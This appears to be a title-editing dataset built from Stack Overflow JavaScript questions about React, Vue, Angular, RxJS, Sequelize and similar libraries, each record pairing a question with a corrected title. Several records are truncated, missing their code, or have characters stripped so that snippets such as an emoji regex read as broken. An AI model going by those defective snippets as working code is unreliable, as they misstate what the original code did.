React AJAX Delete Request," I'm building a CRUD application with React and I wondered if you could help on this issue.I am making a AJAX GET request withcomponentDidMount to the server which retrieves the data and then sets the state in the success function. In the render function I then map over the state array and render each state into a <li> element and include a <button> element.When the <button> element is clicked it calls the delete() function. This then calls the AJAX DELETE request on the ID. My problem is how do I get the component to re-render or update the state after the AJAX request is a success? <code>  import React from 'react';class PostList extends React.Component { constructor() { super(); this.state = { posts: [] } } componentDidMount() { $.ajax({ url: '/posts', type: ""GET"", dataType: 'json', cache: false, success: function(data) { this.setState({posts: data}) }.bind(this) }); } delete(event) { let postId = event.target.parentNode.getAttribute(""data-id""); $.ajax({ url: '/posts/' + postId, type: ""DELETE"", success: function(data) { console.log(data); }.bind(this) }); } render() { let posts = this.state.posts.map( (index) => { return <li data-id={index._id} className=""list-group-item""><a href={""posts/"" + index._id}>{index.title}</a><button className=""btn btn-default"" onClick={this.delete.bind(this)}>Delete</button></li> }) return ( <ul className=""list-group""> {posts} </ul> ) }}export default PostList;",Re-Render React Component After AJAX Request

How to wait for complete render of React component in Mocha?," I have a Parent component that renders a Child component.

Why can't inline SVG be cached in Browsers?," SVGs have been around for years due to its scalability and it is long-familiar that the benefit of inline SVG is one can manipulate it with CSS and JS, and when we want to repeat the same SVG over a html document, then we can use the <use> tag to reference the original element. Furthermore, inline SVGs could also reduce the number of HTTP requests.However, many articles suggest (without explaining the details) that while we use inline SVG to save HTTP request, it is no longer cacheable by a browser as a separate subject, which means it is not reusable across the pages.As I happen to use inline SVGs extensively for a project, I would like to know exactly how inline SVG (the renowned html5 element, which is a w3c recommendation) can be cached in browsers whilst using SVGs with <img> tag or background-image are cacheable.If DOM is cacheable, then why can't the SVG DOM ? (which builds upon and is compatible with DOM Level 2. Ref: https://www.w3.org/TR/SVG/svgdom.html)So far, the solution I came up with cachebility is to use Data URI scheme (Also Ref: Optimizing svgs in data uris )But by doing so, it loses the ability to deal with CSS and JS for styling and manipulation.A few examples around the web suggest the use of JS to load cacheable resource or by replacing placeholder elements such as <object> tag, as well as using localStorage, CacheStorage and Service Worker. But I still need some guide lines to get started to achieve an ideal solution.Could someone shed me some light please?---Ref: Caching SVG Sprite in localStorageRef: Inline SVG and cachingRef: SVG ON THE WEBRef: Do Inline SVGs Weigh Down Websites? <code> ",How can we cache inline SVG in Browsers?

Effectively read file line by line in node," I have already learned that readline can be used to read the file line by line, e.g. However, this is pretty slow, since I compared the performance of grep and JavaScript regexp, and the latter has better performance on the regexps I tested. (see benchmark) So I think I have to blame the node async readline.In my situation, I do not care async at all, I just need to exploit the fast regexp from JavaScript to process very large log files (typically 1-2GB, sometimes up to 10GB). What is the best way of doing this? My only concern is speed.Bonus points: some of the log files are gzipped, so I need to uncompress them. If someone can recommend me a fast line-by-line reader for both plain text and gzipped text exists, I would be really appreciated. <code>  readline .createInterface({input: fs.createReadStream('xxx')}) .on('line', (line) => { apply_regexp_on_line }) .on('close', () => { report_all_regexps });",Efficiently read file line-by-line in node

How to get the the value in a select change event in angular2," I want to navigate useing a dynamically generated select drop down.It doesn't appear I can do that directly, so I'd simply like to make a function call when the select changes.To do that, I have this:---In the template--- suffice it to say that 'navButtons' is an array of objects that have a 'label' field.---In the class--- This actually works fine.I got to this point from the great help of Mark Rajcok and his answer in this older question:How can I get new selection in ""select"" in Angular 2?That said, I'd like to be able to pass the selected value in the navSelected() function call. I'm unsure how to do that.I have tried adding [ngValue]=""button"" on a wild guess from other searches to the option tag and then referencing the button variable in the (change) event handler (so: (change)=""navSelected(button.label)"" and other combos, to no avail. I've seen a lot of references to ngModel but they seem old and I'm not entirely sure they apply anymore (and I couldn't get them to work anyway in RC4).I could probably pull some jquery or whatever out to find the select and get it's value, but that seems very rinky-dink compared to simply being able to call the function correctly. <code>  <select (change)=""navSelected($event)""> <option *ngFor=""let button of navButtons;"" value=""button.route"" >{{button.label}}</option></select> navSelected(navName) { console.log(navName + "" Clicked!"");}",How to get the value in a select change event in angular2

Communication between sibling components in VueJs 2.0," OverviewIn Vue.js 2.x, model.sync will be deprecated.So, what is a proper way to communicate between sibling components in Vue.js 2.x?BackgroundAs I understand Vue.js 2.x, the preferred method for sibling communication is to use a store or an event bus.According to Evan (creator of Vue.js):It's also worth mentioning ""passing data between components"" isgenerally a bad idea, because in the end the data flow becomesuntrackable and very hard to debug.If a piece of data needs to be shared by multiple components, preferglobal stores or Vuex.[Link to discussion]And:.once and .sync are deprecated. Props are now always one-way down. Toproduce side effects in the parent scope, a component needs toexplicitly emit an event instead of relying on implicit binding.So, Evan suggests using $emit() and $on().ConcernsWhat worries me is:Each store and event has a global visibility (correct me if I'm wrong);It's too wasteful to create a new store for each minor communication;What I want is to some scope events or stores visibility for siblings components. (Or perhaps I didn't understand the above idea.)QuestionSo, what is the correct way to communicate between sibling components? <code> ",Communication between sibling components in Vue.js 2.0

is it possible to run two different versions of ReactJS on the same page ?," Hello everyone I am wondering if is possible to run two version of ReactJS on the same page , something similar to jQuery.noConflict().With a bit of research i have found two interesting things :Two Reacts Wont Be FriendsWhile Im happy that everybody seems to be converging on NPM in 2015 and NPM wants developers to use it for managing front-end dependencies, it still has rough edges. The biggest problem with using NPM for front-end dependencies is that if two packages specify a library like React as a dependency, they might get two separate copies of React. Even worse, they might get different versions of it. This works fine for something like Node, but not for browser libraries that want to mess with the same global mutable DOM! NPM tried to solve this with peerDependencies but all hell broke loose and theyre backing out.https://medium.com/@dan_abramov/two-weird-tricks-that-fix-react-7cf9bbdef375#.hfx35f6hlAnd an issue on github: https://github.com/facebook/react/issues/1939However is not clear for me how we could wrap & delivery our ReactJS widgets in order they could run without conflicts on a page using other version of ReactJS .thanks <code> ",is it possible to run two different versions of ReactJS on the same page?
How to run masonry after html5 videos are loaded with infinitescroll?," masonry infinite scroll append html5 videos overlappingi am currently using imagesLoaded library which checks whether images are loaded then calls masonry.But it was not working with html5 video tag, because of this videos gets overlapped on one another.so i changed calling masonry from document.ready to window.load and removed call to imagesLoaded on initial loading i.e. from this to this now html5 videos in masonry are not overlapping, and are rendering perfectly on page's first load i.e. initial load,but as i am also using infinite-scroll which adds more images/videos on scrolling page down, so when new videos are being added to container they are being overlapped , this behavior is caused by early running of masonry before all the video elements are being loaded as imagesloaded cant check the videos loaded.this is the code. i have tried changing document.ready to window.load in above code too, and removing running imagesloaded altogether, but its not working with infinitescroll.,e.g. modified code there is another way i can solve this overlapping issue, by specifying video width and height, but as its responsive design, specifying video width and height breaks the responsiveness.so my question is ,is there any js library simmilar to imagesloaded which makes sure all videos are loaded and then i can call to masonry ?or how can i make sure the videos wont get overlapped on infinitescroll ?update 1 :i have tried many techniques, for infinitescroll doesnt loads new content after pagescroll. doesnt loads new content after pagescroll. overlaps video contentso i have came up with calling infinite-scroll early and slowing down the container.masonry by 3 seconds which is working perfectly for now., but still waiting for proper solution.e.g. above is delaying running masonry by 3 seconds. i tried looking for something like window.load for div, but there is none, so my best option is check whether all the videos and images are loaded and then call masonry after calling infinite-scrolladded working demo http://plnkr.co/edit/46YzHBJ7eFAXfsPqZB1qyou can see the issue, by clicking run and scrolling down. <code>  $(document).ready(function(){ var $container = $('#media');

"On React Router, how to stay logged in state even refresh the page?"," I'm making a website with React, React Router, and Redux. Lots of routes (pages) require users to be logged in. I can redirect to the login page if the user is not logged in like this: Please see the code, I used the onEnter hook to redirect to the '/login' route if the user is not logged in. Data for checking if the user is logged in is in the store and it will update after the user logs in.It's working perfectly, but the problem is when I refresh the page, the store is reset and the user is not logged in state back.I know this happens because the Redux store is just memory storage, so refreshing the page will lose all data from the store.Checking the server session on every refresh may work but this might be too many requests, so that seems like a bad idea.Saving the logged in state data to localStorage might work, but in this case, I should check every AJAX calls fail that request rejected because session is expired or not exists like something, and that seems like a bad idea too.Is there a way to solve this problem more simply? My website needs to handle lots of users so I want to reduce XHR calls as much as possible.Any advice will be very appreciated. <code>  function requireAuth(nextState, replace) { let loggedIn = store.getState().AppReducer.UserReducer.loggedIn; if(!loggedIn) { replace({ pathname: '/login', state: { nextpathname: nextState.location.pathname } }); }}ReactDOM.render( <Provider store={store}> <Router history={history}> <Route path=""/"" component={App}> <IndexRoute component={Index} /> <Route path=""login"" component={Login} /> <Route path=""register"" component={Register} /> <Route path=""dashboard"" component={Graph} onEnter={requireAuth}> ... some other route requires logged in ... </Route> </Route> </Router> </Provider>, document.getElementById('entry'));","On React Router, how to stay logged in state even page refresh?"
Angualr 2 How to detect back button press using router and location.go()?," I have built an app that uses router 3.0.0-beta.1 to switch between app sections. I also use location.go() to emulate the switch between subsections of the same page. I used <base href=""/""> and a few URL rewrite rules in order to redirect all routes to index.html in case of page refresh. This allows the router to receive the requested subsection as a URL param. Basically I have managed to avoid using the HashLocationStrategy.routes.ts If I click on a subsection in the navigation bar 2 things happen:logation.go() updates the URL with the necessary string in order to indicate the current subsectionA custom scrollTo() animation scrolls the page at the top of the requested subsection.If I refresh the page I am using the previously defined route and extract the necessary parameter to restore scroll to the requested subsection. All works fine except when I click the back button. If previous page was a different section, the app router behaves as expected. However if the previous page/url was a subsection, the url changes to the previous one, but nothing happens in the UI. How can I detect if the back button was pressed in order to invoke the scrollTo() function to do it's job again?Most answers I saw relly on the event onhashchange, but this event does not get fired in my app since I have no hash in the URL afterall... <code>  export const routes: RouterConfig = [ { path: '', redirectTo: '/catalog', pathMatch: 'full' }, { path: 'catalog', component: CatalogComponent }, { path: 'catalog/:topCategory', component: CatalogComponent }, { path: 'summary', component: SummaryComponent }]; this._activatedRoute.params .map(params => params['topCategory']) .subscribe(topCategory => { if (typeof topCategory !== 'undefined' && topCategory !== null ) { self.UiState.startArrowWasDismised = true; self.UiState.selectedTopCategory = topCategory; } });",Angular 2 How to detect back button press using router and location.go()?

Sequence of logical OR in ES6 regular expression in Chrome  vs Firefox ," Consider the following Unicode-heavy regular expression (emoji standing in for non-ASCII and extra-BMP characters): Firefox returns [ """", """", """", """", """", """" ] .Chrome 52.0.2743.116 and Node 6.4.0 both return null! It doesnt seem to care if I put the string in a variable and do str.match(), nor if I build a RegExp object via new RegExp('||', 'gu').(Chrome is ok with just ORing two sequences: ''.match(/|/ug) is ok. Its also ok with non-Unicode: 'aakkzzkkaa'.match(/aa|kk|zz/ug) works.)Am I doing something wrong? Is this a Chrome bug? The ECMAScript compatibility table says I should be ok with Unicode regexps.(PS: The three emoji used in this example are just stand-ins. In my application, theyll be arbitrary but distinct strings. But I wonder if the fact that ''.match(/[]/ug) works in Chrome is relevant?)Update Marked fixed on 12 April 2017 in Chromium and downstream (including Chrome and Node). <code>  ''.match(/||/ug)",Sequence of logical OR in ES6/Unicode regular expression in Chrome  vs Firefox 
RxJs flatMapLatest cancel callback. Where is onCancel()?," I've got 2 nested Observable Streams which do HTTP requests. Now I'd like to display a loading indicator, but can't get it working correctly. This will trigger pendingRequests++ 4 times, but pendingRequests-- only once, because flatMapLatest will cancel the inner observable before the first 3 HTTP responses arrive.I couldn't find anything like an onCancel callback. I also tried onCompleted and onError, but those too won't get triggered by flatMapLatest.Is there any other way to get this working?Thank you!EDIT: Desired loading indicator behaviorExample: Single search() call.search() -> start loading indicatorwhen search() response comes back -> disable loading indicatorExample: search() and nextPage() call. (nextPage() is called before search() response came back.)search() -> start loading indicatornextPage() -> indicator is already started, though nothing to do herestop loading indicator after both responses arrivedExample: search(), search(). (search() calls override each other, though the response of the first one can be dismissed)search() -> start loading indicatorsearch() -> indicator is already started, though nothing to do herestop loading indicator when the response for the second search() arrivedExample: search(), nextPage(), search(). (Again: Because of the second search(), the responses from the previous search() and nextPage() can be ignored)search() -> start loading indicatornextPage() -> indicator is already started, though nothing to do heresearch() -> indicator is already started, though nothing to do herestop loading indicator when response for the second search() arrivedExample: search(), nextPage(). But this time nextPage() is called after search() response came back.search() -> start loading indicatorstop loading indicator because search() response arrivednextPage() -> start loading indicatorstop loading indicator because nextPage() response arrivedI tried using pendingRequests counter, because I can have multiple relevant requests at the same time (for example: search(), nextPage(), nextPage()). Then of course I'd like to disable the loading indicator after all those relevant requests finished.When calling search(), search(), the first search() is irrelevant. Same applies for search(), nextPage(), search(). In both cases there's only one active relevant request (the last search()). <code>  var pageStream = Rx.createObservableFunction(_self, 'nextPage') .startWith(1) .do(function(pageNumber) { pendingRequests++; }) .concatMap(function(pageNumber) { return MyHTTPService.getPage(pageNumber); }) .do(function(response) { pendingRequests--; });Rx.createObservableFunction(_self, 'search') .flatMapLatest(function(e) { return pageStream; }) .subscribe();search();nextPage(2);nextPage(3);search();",RxJs flatMapLatest/switchMap cancel callback.

ScrollReveal.js Reveal all on Click?," Is there a way to reveal all items with scroll reveal with a click event? Perhaps a reveal all function? Problem:I am using scroll reveal as well as Isotope. The sorting functionality of isotope reacts strange with scroll reveal.When I click a ""filter"" button I am calling the isotope function filter. However if I scroll down after clicking said filer button there are holes in my grid and I have to ""re-click"" the button after all items have been revealed via scrollingThanks!! UpdateI have added the layout call here - this at least fixes holes that were present before: However - the newly filtered items don't ""fade in"" as they do with scroll reveal they ""tile in"" as with the styling from isotope. The ideal situation would be a reveal all and layout scenario - that way you cannot notice any differences in animations - or another situation could be just the simple constant fading in regardless of filters clicked. Update UpdateWe decided to make all the tiles the same height so no longer are experiencing the problem. Thanks <code>  $grid.isotope({filter: '.fish-filter'}); // example window.sr = ScrollReveal({ beforeReveal: function (domEl) { //$grid.isotope( 'layout'); // fixes holes }, afterReveal: function (domEl) { $grid.isotope('layout'); }});",ScrollReveal.js  Reveal All items on Click or Event?

Does bind create a new function?," So, let's say we have this function: If I do this Will now the inc function be copied in the memory with the given bound value or a single function is stored in the memory and only a reference to the bound value is saved?

How to safely wrap a String (JSON) into a List in JavaScript," I have a function that takes in an Array, iterates over it finding all Objects and displays them to the UI.In rare cases, I have to supply an Object (result from a WS as application/JSON) which is not an Array by default and hence my function fails to iterate over it and display on the UI.In normal cases my Array looks like this: and this works like it is supposed to. However, sometimes the data I get could be this: and my function that takes in an array looks like this: Is there a way I can detect that the single object which is not an array is an odd one and probably put it into a List on the fly and pass it to a function?So far I have tried to use typeof and also tried to create a new Array on the fly and push my object into it but it prints out a 1 when I do that. <code>  [ { ""name"" : ""foo""}, { ""name"" : ""bar""}, { ""name"" : ""baz""}] { ""name"" : ""I am not in a List""} function loadJSONIntoUI(data) { for (var aMsg = 0; aMsg < data.length(); aMsg++) { // Do something with each `index` in the List }}",How to safely wrap an object into an array in JavaScript
Strategy for disabling elements in a grid that are already related to a father," I have multiple grids that display data based on a given filter (in a web application using a REST Api). The data structure displayed is always the same (to simplify the problem), but depending on the screen on which the user is, the displayed results are different.In addition, and this is the issue, some results must be disabled so that the user cannot select them.Example: A Foo has N Bars. If I want to add a new child (bar) to the father (foo), I go to the search screen, but I want the filtered grid shows as disabled children which are already related to the father.Currently I'm controlling this issue on the server (database querys) by doing specifics joins depending on the scenario and ""disabling"" results I don't want. But this approach causes I cannot reuse queries (due to specifics joins. Maybe I need to search Bars int order relate them with other father Baz, and I want disable Bars that are already related with current father...)Another approach could be the following:Save the children (only ids) related to the father in an array in memory (javascript)In the ""prerender"" grid event (or similar) check for each element whether it is contained in the previous array or not (search by id). If so, mark it as disabled (for example).This is a reusable solution in client-side and I can always reuse the same query in server side.Before starting to implement this solution I would like to know if there is any better option.I'm sure this is a recurring problem and I don't want to reinvent the wheel.Any strategy or suggestion?Edit: show example:Assuming this model: I have two different screens: one showing items belongs to one category and another showing items belongs to one sales promotion. In each screen I can search for items and add them to the Category or SalesPromotion. But when I'm searching items, I want items that already belongs to Category/SalesPromotion to show as disabled (or not shown, for simplicity in this example).I can do this in server, doing queries like these: You can imagine what happens if I had more and more scenarios like these (with more complex model and queries of course).One alternative could be:Store items that already belongs to current Category/SalesPromotion in memory (javascript, clientside).On grid prerender event (or equivalent) in clientside determine what items must be disabled (by searching each row in stored items).So, my question is wheter this approach is a good solution or is there a well-known solution for this issue (I think so). <code>  Category N:M ItemSalesPromotion N:M Item -- Query for search Items in Category screenSELECT * FROM ITEMS iLEFT JOIN ItemsCategories ic on ic.ItemId = i.ItemIdWHERE ic.CategoryId IS NULL OR ic.CategoryId <> @CurrentCategoryId-- Query for search Items in SalesPromotion screenSELECT * FROM ITEMS iLEFT JOIN ItemsSalesPromotions isp on isp.ItemId= i.ItemIdWHERE isp.PromotionId IS NULL OR isp.PromotionId <> @CurrentPromotionId",How to disable elements in a grid

Sequelize: creating elements of a hasMany association," First time asking a Stack Overflow question so I hope I phrase it correctly: I'm trying to build a simple blog application as a homework assignment while using Sequelize for the database management. However, I have a problem when trying to create some testdata when I try to create elements that are associated to my model. Here is my code, it should be same syntax as in the documentation (http://docs.sequelizejs.com/en/v3/docs/associations/#creating-elements-of-a-hasmany-or-belongstomany-association). Current behavior: both users are created with all attributes, Posts are not created at all and no errors are given. And here are my model and relations declarations: <code>  masterdb.sync({force:true}).then( x => { return Promise.all([ User.create({ username:'Timothy', password:'plain-text', email:'x@msn.nl', Posts: [ { body: 'Hello everyone, my name is Timothy.' }, { body: 'Today was a good day.'} ] }, { include: [ Post ] }), User.create({ username:'Jack Sparrow', password:'plain-text', email:'jacksparrow@msn.nl' }), ])}).catch(x => console.log(x)) const Sequelize = require('sequelize')const masterdb = new Sequelize('blogapplication', process.env.POSTGRES_USER, process.env.POSTGRES_PASSWORD, { dialect: 'postgres',})const User = masterdb.define('user', { username: { type: Sequelize.STRING, unique: true, allowNull: false }, password: { type: Sequelize.STRING, allowNull: false }, email: { type: Sequelize.STRING, unique: true, allowNull: false }}, { paranoid: true})const Post = masterdb.define('post', { body: { type: Sequelize.STRING(9001), allowNull: false, unique:true, }}, { paranoid: true})User.hasMany(Post)",Creating elements of a hasMany association

So I receive an error about the ""("".So instead of JSON like I receive JSONP like However, I'm unsure what I can do to get the JSON out of this via the fetch promises ? How can I manipulate the response with one of my own functions, or is there a more natural way ?So in the first then() I'm unsure what I can do to get out the json (I've tried operating on the response, but that just seems to look at the promise, so I'm unsure how react-native fetch is operating with this). <code>  fetch('https://facebook.github.io/react-native/movies.json') .then((response) => response.json()) .then((responseJson) => { return responseJson.movies; }) .catch((error) => { console.error(error); }); {""id"": ""1"", ""movies"" : [ { ""id"" : ""123"" } ] } ?( {""id"": ""1"", ""movies"" : [ { ""id"" : ""123"" } ] });",Get json from jsonp fetch promise

Vue-router reload component," I have a few routes that each load 3 components. Two of the components are the same on all routes.When I move between those routes I want to pass new data and on some init event of the component I want to fill the data of that component so it reflects on the UI.Also I want to retrigger bootstrap animations of components being loaded.How would I go about doing that.Because right now, I don't know where in the component lifecycle would I fetch the data and rerender the component with this new data.Concretly in myapps/1 and /newapp/ I have a main view component and a sidebar component. In the /newapp/ URL I want all icons on the sidebar to be red (nothing on the main view has been filled) and the main view should be empty.On the myapps/1 I want to load the data from the server into the main view and if it's all filled I want icons on the sidebar to be green.What now happens I load myapps/1, click on the second item in the sidebar and the main view changes to the second view. Then I router.push(""/newapp/); and sidebar stays on the second item and second main view.So router.push(""/myapps/""); doesn't reload my sidebar and my main view.EDIT:Here you see my routes, sidebars and default are the same. This is my ProjectMain.vue This is my router-view in index.html: And I have another one in index.html, the default one: When I click on some item on Sidebar i emit event to the ProjectMain to switch out the component. So like this:In Sidebar: or And than in ProjectMain: If I got to ""/myapps/:id"". It loads the sidebar and ProjectMain and I get a little animation of the sidebar and the ProjectMain with this bootstrap classes:<div class=""animated fadeInUp""> and both components got through the entire lifecycle.By default appOverview is selected in sidebar and CurentProjectAppOverview.vue is loaded as a component in ProjectMain.Than I click on appSettings in the sidebar and class is added to that item in the sidebar to mark it as selected and in the ProjectMain CurrentProjectSettings.vue is loaded as a component.But then in the breadcrumbs I have a button to go to ""/myapps/newversion/:id""Here is the problem. When I click to go to ""/myapps/newversion/:id"" (router.push(""/myapps/newversion/"" + id);) the second item on the sidebar remains selected (appSettings) and in ProjectMain CurrentProjectSettings.vue remains loaded, and I don't get the bootstrap animation of the sidebar and ProjectMain, and the components don't go through their lifecycle.What I want here when I click the button to go to ""/myapps/newversion/:id"" is my bootstrap animation (<div class=""animated fadeInUp"">), I want the Sidebar and ProjectMain to go through their entire lifecycle. And I want the default item to be selected on the sidebar (so appOverview) and default component to be loaded in ProjectMain (so CurentProjectAppOverview.vue).There are colored buttons for the each item in the sidebar. If I go to ""/myapps/newversion/:id"" from ""/myapps/:id"", I want to load the data from the server into CurrentProjectAppOverview.vue and if all data is filled I want the button on the sidebar to be green and if not it should be red.So In short when moving between this two routes I want to be able to load data and fill the fields I want, and I want bootstrap animation and default views to be selected and loaded and they should go through their entire lifecycle. Now router just reuses them as they are.So something like ""ReloadComponent: true"", or destroy and recreate component.I could duplicate SidebarProject.vue and ProjectMain.vue and rename them and in each route load basically a copy but that would mean I have to write the same code in different .vue files.Before there was an option to set YouComponent.route.canReuse to false, which would do what I want, I think, but it is removed in the newest version. <code>  const routes = [ { path: ""/myapps/newproject"", components: { default: ProjectMain, ""breadcrumbs"": BreadcrumbsNewProject, ""sidebar"": SidebarProject, } }, { path: ""/myapps/:id"", components: { default: ProjectMain, ""breadcrumbs"": BreadcrumbsCurrentProject, ""sidebar"": SidebarProject, } }, { path: ""/myapps/newversion/:id"", components: { default: ProjectMain, ""breadcrumbs"": BreadcrumbsNewVersion, ""sidebar"": SidebarProject, } }]; <template> <div class=""wrapper wrapper-content""> <component :is=""currentProjectMain""></component> </div></template> <router-view name=""sidebar""></router-view> <router-view></router-view> eventBus.$emit(""currentProjectMainChanged"", ""appOverview""); eventBus.$emit(""currentProjectMainChanged"", ""appSettings""); eventBus.$on(""currentProjectMainChanged"", function(data) { if(data === ""appOverview"") { self.currentProjectMain = CurrentProjectAppOverview; }else if(data === ""appSettings"") { self.currentProjectMain = CurrentProjectSettings; }});",Vue-router reload components

Css transition-delay minus value?," I am trying to understand negative values for the CSS transition-delay property. Please look at the code example first. There are two divs which have different transition delays.I thought giving the negative value for the delay would be the same as giving a positive value to right div (0.2s) but it is not behaving the same. I think it does not paint for 0.2s which makes transition jumpy.Can anyone explain me what does negative transition-delay value do?

Vanilla JS Toggle Menu when click outside of the menu," I am trying to rephrase my question and will go through all the steps i did and especially where i failed. I don't have a deep knowledge of JS but the will to learn by practice as well as the help of the community.I stumbled across this answer and realized the benefit. Since i don't want to use jQuery i started to rewrite it in JS.First step was a to write a basic simple function to open the menu on 'click' and close it on a click outside of the focused element using the blur(); method.Reference jQuery code from @zzzzBov : My JS code: Opening the menu works, the problem is that it will only close on 'click' outside of the menu if the focused element (Menu) is clicked once before: I tried to continue with the second step, that was addressing to the two major issues: The first is that the link in the dialog isn't clickable. Attempting to click on it or tab to it will lead to the dialog closing before the interaction takes place. This is because focusing the inner element triggers a focusout event before triggering a focusin event again. The fix is to queue the state change on the event loop. This can be done by using setImmediate(...), or setTimeout(..., 0) for browsers that don't support setImmediate. Once queued it can be cancelled by a subsequent focusin: The second issue is that the dialog won't close when the link is pressed again. This is because the dialog loses focus, triggering the close behavior, after which the link click triggers the dialog to reopen. Similar to the previous issue, the focus state needs to be managed. Given that the state change has already been queued, it's just a matter of handling focus events on the dialog triggers:Reference jQuery code from @zzzzBov : My JS code: Opening the menu still works, but closing on click outside stoped working, after research i figured that blur and focus are the right methods but i guess i am missing something essential. I am sure there is still a lot i have to learn, but help would be much appreciated.

How to make material components work with Karma in unit testing angular 2?," I have an angular CLI project set up. I've made a form that uses angular material components, like <md-card>.I'm just starting out with writing my first Karma/Jasmine unit test, following the steps in the angular docs.This is my component template: This is my karma spec: At this point, I'm just trying to run the basic unit test that the title is being displayed properly.However, I'm getting a lot of material specific errors. Like No provider for MdDialog.I'm opening an md Dialog on clicking a link. THe code is in the (fairly long) .ts file, but that's not the issue here.Where would I add MdDialog in the testbed?

ReactJS changed DOM element reference," I am updating a part of a page via a standard this.setState mechanism. I want to grab a hold of a elements that has been changed on a web page and provide a visual feedback to a user.Let's say we have a component RichText that gets a data props. To render rich text it will delegate render to smaller components like Paragraph, Header, BulletPoints, Text, etc. The final result is a properly rendered rich text.Later data props change (e.g. socket push). As a result of that Paragraphs can be added, or text changed, or things could move around. I want to provide a visual feedback to a user by simply highlighting HTML nodes that were changed. In a nutshell I want to achieve what Chrome inspector is showing when you are looking at HTML tree. It blinks DOM changes.ReactJS knows what was changed. Ideally I would like to get an access to that knowledge.While smaller Components like Paragraph could be responsible for highlighting a difference within themselves, I don't think they have enough of a knowledge of the outside world to make it work as expected. Format (simplified version) My current solution I have a top level Component that knows how to render the entire Document by delegating job to other components. I have a live version HOC of it: LiveDocument that is responsible for a change visualization. So I capture DOM before setState and after setState. Then I am using HtmlTreeWalker to spot a first difference (ignoring certain elements as I walk the tree).  <code>  { content: [{ type: 'Document', content: [{ type: 'Paragraph', content: [{ type: 'Text', text: 'text text' }, { type: 'Reference', content: 'text text' }, ]}, { type: 'BulletPoints', content: [{ type: 'ListEntry', content: [{ type: 'Paragraph', content: [{ type: 'Text', text: 'text text' }, { type: 'Reference', content: 'text text' }] }] }] }]",ReactJS access to Virtual DOM reconciliation result

Passing additional parameters in higher order functions," Consider this example: How can I pass an additional parameter in excludeFoos?For example:  <code>  const samples = [""foo"", ""bar""];const excludeFoos = function(item) { return item !== ""foo"";}const foos = samples.filter(excludeFoos); const samples = [""foo"", ""bar""];const exclude = function(item, str) { return item !== str;}// obviously won't work but you get the pointconst foos = samples.filter(exclude(""foo""));console.log(foos); // [""bar""]",Passing additional parameters in higher-order functions
D3.js: Toggling class whose name is based on data," D3 has 2 ways of setting a class: I'm looking for a way to add a class named as per the data. I.e. something like: I don't want to use id because multiple DOM elements will share that class.I don't want to use attr because it may potentially overwrite other classes already there.So I could do which feels a bit hackish.Any better solution? Or a feature underway? <code>  selection.attr(""class"", (d) => d.isFoo ? ""foo"" : """");selection.classed(""foo"", (d) => d.isFoo) selection.classed((d) => ""node"" + d.id, true); selection.attr(""class"", (d) => d3.select(this).attr(""class"") + "" node"" + d.id);",D3.js: Adding class whose name is based on data

Input event listener on Android has a bug," I don't know why, but after hours spent dealing with this I can say there's something wrong.I have a simple input I want it to accept only numbers (digit [0-9]) and nothing more. In order to achieve this I added an event listener where I control the keycode of the event.Nothing special and everything working on almost all platforms, problems comes with Android. Here the type=""number""causes numeric keyboard to appear - and that's great - with also some other characters (comma, dot, hyphen...). When you press one of this special characters the behavior is strange:onkeypress event: absolutely not firing (why???)onkeydown event: the event is firing and the relative function is called. The problem is that the browser has already typed the character (why??) so is not possible to call the ""preventDefault"" function of ""event"".on input event: the event is firing but ""code"" and ""which"" properties of ""event"" object are undefined. Moreover, like before, the browser has already typed the character.What am I missing?My environment is powerd by AngularJs so I setted up event listeners inside a directive. However doing same things with jQuery doesn't solve problems.Someone can suggest to use a ""$parsers"" to push my custom value without unwanted characters. Anyway this doesn't work I guess because the type of the input is ""number"" and it expect only numbers (another way to say the browser on Android is doing something wrong..)Here there's a working Fiddle, open it on Android. <code>  <input type=""number"">","Event listeners (onkeypress, onkeydown) on input not working in Android numeric keyboard"
Google Maps API Winding path within polygon with rotate/grow/shrink options," I'm not certain what I'm trying to achieve is possible, but I know there are some creative people here and admittedly, I'm going to need some hand holding on this one. Here is a mockup of what I'd like to add:Auto-generating/filling a shape inside a polygon. For my purpose, I don't need boxes, I need a single winding path to fill every user-created polygon. I need that winding path to hug the boundaries of the polygon as in my picture above.Draw small boxes inside a polygonHere is the code I'm trying to apply this feature to: EDIT: Looks like the grid-filled polygon from my image has been done using the Google API in the Android App, Tower. Here's an exact example of the grid type I'm wanting to create (skip to 2:10): https://www.youtube.com/watch?v=u-k8ax2JGC4. Looks like they offer the source code here: https://github.com/DroidPlanner/Tower, but I'd have no idea how to extract what I need and convert to javascript...Here are a few more examples of how the generated polylines might wind:This would use the curve of the polygon to continue back and forth around the gap, but this isn't very efficient.This way would be ideal in the case where the polygon is concaved like this. The polyline path could work it's way down one side and back up the other.I'm open to any way of accomplishing this the most efficient way possible (least distance traveled).  <code>  //debugger;///////////////////////////////////////////////////////////////Map Specificationsfunction initialize() { var map = new google.maps.Map(document.getElementById('map'), { zoom: 18, center: new google.maps.LatLng(33.27144940863937, -117.2983479390361), mapTypeId: google.maps.MapTypeId.SATELLITE, mapTypeId: google.maps.MapTypeId.HYBRID, tilt: 0, disableDefaultUI: true, zoomControl: true, mapTypeControl: false, scaleControl: true, streetViewControl: true, rotateControl: true, fullscreenControl: false });

Sinon.JS 'Should wrap property of object' when stubbing," I am trying to use Sinon to test a JS component which looks a bit like this... The test looks like this... But I can't get past the line let bootboxAlertStub = Sinon.stub(Bootbox, 'alert'); because I get an error from Karma saying 'Should wrap property of object'. I've tried wrapping it up in a Sinon.test wrapper as well and using this.stub but the error the is even more obtuse.I've been through the Sinon.JS docs and searched online but I'm stuck. The code works fine.I have looked at this posting, which is similar - Stubbing a class method with Sinon.js but it's not quite the same.Looking at the actual underlying bootbox JavaScript file I'm effectively trying to stub a method that looks a bit like this (cut down)... The JS file then returns the exports at the end... Looking at some Github postings it seems that it may not be possible to stub these particular calls as the underlying calls are utility functions rather than object functions.I have mitigated this (in a horrible way) by changing my Bootbox wrapper class as follows... This solves one problem and introduces another. While I can now stub Bootbox, when stubbed I can't get the arguments....(from the test) This is frustrating - The arguments are passed as a complex argument so a 'calledWith' assertion isn't going to cut it.Is there any way I can get the arguments for a stub? <code>  import Bootbox from ""../helpers/bootbox"";import Guard from ""../helpers/guard"";import UrlHelper from ""../helpers/url-helper"";export default class DeleteButton { /** * Creates an instance of DeleteButton. * * @param {object} element The DOM element to make into a delete button. * * @memberOf DeleteButton */ constructor(element) { Guard.throwIf(element, ""element""); this.deleteUri = element.getAttribute(""data-delete-uri"") || UrlHelper.current.url().split('?')[0]; this.title = element.getAttribute(""data-title"") || `Delete the item?`; this.cancelText = element.getAttribute(""data-cancel"") 